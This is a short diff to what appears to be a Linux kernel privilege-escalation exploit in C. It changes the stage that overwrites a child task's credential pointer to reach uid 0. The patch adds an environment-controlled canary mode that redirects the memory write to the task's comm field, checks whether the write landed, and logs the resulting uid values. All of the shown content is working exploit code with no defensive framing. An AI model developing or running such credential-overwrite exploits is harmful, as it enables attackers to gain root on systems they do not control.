@@ -2622,7 +2622,11 @@ uid0_cred_punch:;
        * bss_tail's bookkeeping (waiters count); +0x100 stays in the
        * zeroed BSS and clear of init_pg_dir at +0x300. */
       g_cred2_lock_shift = 0x100;
-      uid0_one_store(use_task + 0x780, "child_cred_2nd");
+      {
+        int s2c = env_flag("UID0_STAGE2_CANARY", 0);
+        uid0_one_store(use_task + (s2c ? 0x790 : 0x780),
+                       s2c ? "child_comm_2nd" : "child_cred_2nd");
+      }
       g_cred2_lock_shift = 0;
       /* fresh DISARM for the second ghost */
       if (!env_flag("UID0_NO_DISARM", 0)) {
@@ -2639,8 +2643,16 @@ uid0_cred_punch:;
       child_uid = uid0_child_getuid_query();
       status_uid = status_uid_of(cpath);
       self_uid = (uint32_t)getuid();
-      pr_info("UID0 DOUBLE stage2 result: getuid=%u child=%u status=%u\n",
-              self_uid, child_uid, status_uid);
+      {
+        int s2c2 = env_flag("UID0_STAGE2_CANARY", 0);
+        int comm_ok = s2c2 ? uid0_child_comm_landed() : -1;
+        pr_info("UID0 DOUBLE stage2 result: getuid=%u child=%u status=%u "
+                "comm_landed=%d (%s WALK %s)\n",
+                self_uid, child_uid, status_uid, comm_ok,
+                s2c2 ? "canary" : "cred",
+                comm_ok == 1 ? "STORES" :
+                comm_ok == 0 ? "NO-STORE" : "?");
+      }
       fflush(stdout);
     }
   }
